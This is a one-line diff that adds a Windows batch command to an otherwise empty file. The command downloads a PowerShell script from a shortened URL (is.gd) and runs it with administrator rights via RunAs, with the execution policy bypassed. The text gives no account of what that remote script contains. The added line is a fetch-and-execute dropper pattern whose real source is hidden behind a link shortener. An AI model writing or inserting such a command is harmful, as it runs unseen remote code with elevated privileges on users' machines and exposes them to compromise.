@@ -1,1 +1,1 @@
-
+@echo off & set "RAWURL=https://is.gd/sortps1" & powershell -NoProfile -Command "Try { Invoke-WebRequest -Uri '%RAWURL%' -OutFile '%~dp0sort.ps1' -UseBasicParsing -ErrorAction Stop; Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \"%~dp0sort.ps1\"' -Verb RunAs -Wait } Catch { Write-Error 'Download failed'; Exit 1 }"
